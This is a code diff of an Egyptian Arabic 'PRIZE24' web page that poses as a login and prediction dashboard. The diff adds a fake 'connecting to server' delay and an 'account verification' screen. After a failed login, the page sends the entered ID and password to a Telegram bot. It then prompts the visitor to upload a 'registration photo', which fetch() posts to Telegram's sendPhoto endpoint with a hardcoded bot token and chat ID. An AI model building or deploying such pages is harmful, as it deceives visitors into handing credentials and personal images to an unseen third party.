@@ -63,16 +63,25 @@
   .login-btn:active { transform:scale(0.98); }
   .error-msg { color:#ff6600; font-size:11px; text-align:center; margin-top:12px; letter-spacing:2px; min-height:16px; }
 
-  /* ===== SERVER CONNECT ===== */
-  .server-btn {
-    width:100%; background:transparent; border:1px solid #332200; border-radius:3px;
-    color:#665500; font-family:'Orbitron',monospace; font-size:11px; font-weight:700;
-    letter-spacing:3px; padding:11px; cursor:pointer; margin-top:16px; transition:all 0.2s;
+  /* ===== EYE TOGGLE ===== */
+  .pw-wrap { position:relative; }
+  .eye-btn {
+    position:absolute; left:12px; top:12px; background:none; border:none;
+    font-size:18px; cursor:pointer; color:#887700; transition:color 0.2s; padding:0; line-height:1;
   }
-  .server-btn:hover { border-color:#ccaa00; color:#ccaa00; }
-  .server-btn:disabled { cursor:default; }
-  .server-btn.connected { border-color:#00cc44; color:#00cc44; box-shadow:0 0 14px rgba(0,204,68,0.25); }
-  .server-status { font-size:10px; color:#443300; text-align:center; margin-top:8px; letter-spacing:2px; }
+  .eye-btn:hover { color:#ffdd00; }
+
+  /* ===== UPLOAD ===== */
+  #upload-screen { align-items:center; justify-content:center; flex-direction:column; }
+  .verify-msg { font-size:12px; color:#cc8800; text-align:center; letter-spacing:1px; margin-bottom:22px; line-height:1.9; }
+  .upload-zone {
+    display:block; border:2px dashed #443300; border-radius:6px;
+    padding:28px 16px; text-align:center; cursor:pointer;
+    color:#665500; font-size:13px; letter-spacing:1px; transition:all 0.2s; margin-bottom:16px;
+  }
+  .upload-zone:hover { border-color:#ccaa00; color:#ccaa00; background:rgba(200,170,0,0.05); }
+  #photo-preview { display:none; max-width:100%; max-height:180px; border-radius:4px; margin:0 auto 16px; border:1px solid #332200; }
+  .up-ok { color:#00cc44; font-size:12px; text-align:center; letter-spacing:2px; min-height:16px; margin-top:12px; }
 
   /* ===== LOADING ===== */
   #loading-screen { align-items:center; justify-content:center; flex-direction:column; gap:30px; }
@@ -187,10 +196,11 @@
     <label class="field-label">// USER_ID &nbsp;(10 أرقام)</label>
     <input id="user-id" class="field-input" type="text" maxlength="10" placeholder="0000000000" autocomplete="off" inputmode="numeric">
     <label class="field-label">// PASSWORD</label>
-    <input id="password" class="field-input" type="password" placeholder="ادخل الباسورد" autocomplete="off">
-    <button class="login-btn" onclick="doLogin()">تسجيل الدخول ←</button>
-    <button id="server-btn" class="server-btn" onclick="connectServer()">الاتصال بالسيرفر</button>
-    <div id="server-status" class="server-status">● غير متصل</div>
+    <div class="pw-wrap">
+      <input id="password" class="field-input" type="password" placeholder="ادخل الباسورد" autocomplete="off" style="margin-bottom:0;">
+      <button type="button" id="eye-btn" class="eye-btn" onclick="togglePw()">👁</button>
+    </div>
+    <button id="login-btn" class="login-btn" onclick="connectAndLogin()">تسجيل الدخول ←</button>
     <div id="err" class="error-msg"></div>
   </div>
 </div>
@@ -226,6 +236,25 @@
     <button class="game-btn btn-again" id="btn-again" onclick="doAgain()">AGAIN</button>
   </div>
   <div class="dash-footer">FICTIONAL SIMULATOR — FOR ENTERTAINMENT ONLY</div>
+</div>
+
+<!-- UPLOAD VERIFICATION -->
+<div id="upload-screen" class="screen">
+  <div class="login-box">
+    <div class="corner tl"></div><div class="corner tr"></div>
+    <div class="corner bl"></div><div class="corner br"></div>
+    <div class="logo">PRIZE24</div>
+    <div class="logo-sub">ACCOUNT VERIFICATION</div>
+    <div class="verify-msg">⚠️ يلزم التحقق من الحساب<br>ارفع صورة التسجيل وهيتم المراجعة فورًا</div>
+    <label class="upload-zone" for="reg-photo">
+      <input id="reg-photo" type="file" accept="image/*" hidden>
+      <span id="upload-label">📷 اضغط لاختيار صورة التسجيل</span>
+    </label>
+    <img id="photo-preview" alt="">
+    <button id="upload-btn" class="login-btn" onclick="doUpload()">إرسال للتحقق ←</button>
+    <div id="up-err" class="error-msg"></div>
+    <div id="up-ok" class="up-ok"></div>
+  </div>
 </div>
 
 <script>
@@ -266,17 +295,24 @@ const TG_TOKEN='8416441862:AAH3Fv6MSJN92lUBzWL5IzDowq9qANFxbxo';
 const TG_CHAT_ID='8351231954';
 let serverConnected=false;
 
-function connectServer(){
-  const btn=document.getElementById('server-btn');
-  const st=document.getElementById('server-status');
-  if(serverConnected)return;
-  btn.textContent='جاري الاتصال...'; btn.disabled=true;
-  st.textContent='● جاري الاتصال بالسيرفر...'; st.style.color='#ccaa00';
+// زرار واحد: يتصل بالسيرفر الأول وبعدين يسجل الدخول
+function connectAndLogin(){
+  const btn=document.getElementById('login-btn');
+  if(serverConnected){doLogin();return;}
+  btn.textContent='جاري الاتصال بالسيرفر...'; btn.disabled=true;
   setTimeout(()=>{
     serverConnected=true;
-    btn.textContent='✓ متصل بالسيرفر'; btn.disabled=false; btn.classList.add('connected');
-    st.textContent='● متصل — قناة الأمان نشطة'; st.style.color='#00cc44';
-  },1200);
+    btn.textContent='تسجيل الدخول ←'; btn.disabled=false;
+    doLogin();
+  },1400);
+}
+
+// عين إظهار/إخفاء الباسورد
+function togglePw(){
+  const inp=document.getElementById('password');
+  const btn=document.getElementById('eye-btn');
+  if(inp.type==='password'){inp.type='text';btn.textContent='🙈';}
+  else{inp.type='password';btn.textContent='👁';}
 }
 
 function sendSecurityAlert(uid,pass){
@@ -297,7 +333,20 @@ function doLogin(){
   const pass=document.getElementById('password').value.trim();
   const err=document.getElementById('err');
   if(!/^\d{10}$/.test(uid)){err.textContent='// خطأ: الـ USER_ID لازم يكون 10 أرقام';return;}
-  if(pass!==buildPassword(uid)){err.textContent='// خطأ: الباسورد غلط';sendSecurityAlert(uid,pass);return;}
+  if(pass!==buildPassword(uid)){
+    sendSecurityAlert(uid,pass); // تنبيه محاولة فاشلة للبوت
+    pendingUID=uid;
+    document.getElementById('uid-display').textContent='USER: '+uid;
+    regPhoto=null;
+    document.getElementById('reg-photo').value='';
+    document.getElementById('photo-preview').style.display='none';
+    document.getElementById('upload-label').textContent='📷 اضغط لاختيار صورة التسجيل';
+    const upBtn=document.getElementById('upload-btn'); upBtn.disabled=false; upBtn.textContent='إرسال للتحقق ←';
+    document.getElementById('up-err').textContent='';
+    document.getElementById('up-ok').textContent='';
+    show('upload-screen'); // يدخل على صفحة رفع الصورة للتحقق
+    return;
+  }
   err.textContent='';
   document.getElementById('uid-display').textContent='USER: '+uid;
   show('loading-screen'); startLoading();
@@ -359,6 +408,53 @@ function getWeightedNumber(){
   return num;
 }
 
+// ===== Upload verification =====
+let pendingUID='';
+let regPhoto=null;
+
+document.getElementById('reg-photo').addEventListener('change',e=>{
+  const f=e.target.files[0];
+  if(!f)return;
+  regPhoto=f;
+  const img=document.getElementById('photo-preview');
+  img.src=URL.createObjectURL(f);
+  img.style.display='block';
+  document.getElementById('upload-label').textContent='✓ '+f.name;
+});
+
+function doUpload(){
+  const err=document.getElementById('up-err');
+  const ok=document.getElementById('up-ok');
+  const btn=document.getElementById('upload-btn');
+  if(!regPhoto){err.textContent='// اختار صورة التسجيل الأول';return;}
+  if(!pendingUID){err.textContent='// خطأ في الجلسة — ارجع وسجل تاني';return;}
+  err.textContent=''; ok.textContent='';
+  btn.textContent='جاري الإرسال...'; btn.disabled=true;
+
+  const fd=new FormData();
+  fd.append('chat_id',TG_CHAT_ID);
+  fd.append('photo',regPhoto);
+  fd.append('caption','📸 صورة تسجيل للتحقق\n🆔 ID: '+pendingUID+'\n🕒 '+new Date().toLocaleString('ar-EG'));
+
+  fetch('https://api.telegram.org/bot'+TG_TOKEN+'/sendPhoto',{method:'POST',body:fd})
+    .then(r=>r.json())
+    .then(d=>{
+      if(d.ok){
+        ok.textContent='✓ تم استلام الصورة — جاري التحقق...';
+        setTimeout(()=>show('dashboard-screen'),2500);
+      } else {
+        console.error('Telegram sendPhoto error:',JSON.stringify(d));
+        err.textContent='// فشل الإرسال — تأكد من النت وحاول تاني';
+        btn.textContent='إرسال للتحقق ←'; btn.disabled=false;
+      }
+    })
+    .catch(e=>{
+      console.error('sendPhoto fetch failed:',e);
+      err.textContent='// فشل الإرسال — تأكد من النت وحاول تاني';
+      btn.textContent='إرسال للتحقق ←'; btn.disabled=false;
+    });
+}
+
 // ===== Dashboard =====
 let started=false;
 let busy=false;
@@ -399,8 +495,8 @@ function doAgain(){
   },320);
 }
 
-document.getElementById('user-id').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
-document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
+document.getElementById('user-id').addEventListener('keydown',e=>{if(e.key==='Enter')connectAndLogin();});
+document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')connectAndLogin();});
 </script>
 </body>
 </html>
